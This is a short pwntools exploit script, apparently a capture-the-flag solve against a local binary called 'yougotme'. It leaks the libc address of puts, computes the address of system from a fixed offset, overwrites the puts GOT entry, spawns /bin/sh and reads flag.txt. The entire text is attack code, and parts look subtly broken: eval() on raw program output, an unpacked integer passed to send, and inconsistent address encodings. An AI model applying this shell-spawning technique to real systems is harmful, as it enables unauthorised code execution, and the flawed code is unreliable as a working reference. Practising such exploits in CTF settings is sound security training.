from pwn import *

io = process("./yougotme")
io.recv()

# Read the address of puts in libc
io.sendline("\x32")
out = io.recv()
print(out)
print(out.decode())

# address at which puts address is stored in GOT table
io.send(p32(420776))
# out = io.recv()
# print(out)
# print(out.decode())
puts_add = out.decode()

# calc libc system address by sub offset 32190 from puts address
sys_add = eval(puts_add) - 0x32190

# write to memory
io.send(b"1")

# address to write
io.send(b"420776")
puts_add = io.recv()

# what to write
io.send(sys_add)
io.recvall()

# call echo and pass argument as /bin/sh
io.send(b"3")
io.send(b"/bin/sh")

io.send(b"cat flag.txt")
print(io.recv().decode())